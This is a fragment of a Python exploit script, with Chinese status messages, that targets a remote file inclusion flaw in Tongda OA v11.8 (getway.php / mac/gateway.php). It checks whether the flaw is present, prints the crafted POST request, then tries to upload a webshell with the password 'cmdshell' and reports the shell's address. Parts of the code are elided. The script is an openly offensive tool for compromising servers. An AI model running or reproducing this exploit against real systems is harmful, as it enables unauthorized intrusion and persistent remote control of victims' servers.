...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测通达OA v11.8 getway.php 远程文件包含漏洞")
    try:
        ...
        if response2.status_code == 200:
            print(now_time() + ' [SUCCESS]  包含漏洞存在，包含数据包为:{}'.format(vlun_url))
            print(now_time() + ''' [SUCCESS]  POST /mac/gateway.php HTTP/1.1
                       Host: 
                       User-Agent: Go-http-client/1.1
                       Content-Length: 54
                       Content-Type: application/x-www-form-urlencoded
            ...
            if shell.status_code == 200:
                print(now_time() + ' [SUCCESS]  上传webshell成功，密码为cmdshell，shell地址:{}'.format(shell_url))

            else:
                print(now_time() + ' [WARNING]  通达OA 包含日志成功，可查取日志文件，但无法在目录下生成webshell')
        else:
            print(now_time() + ' [WARNING]  通达OA v11.8远程包含不存在')
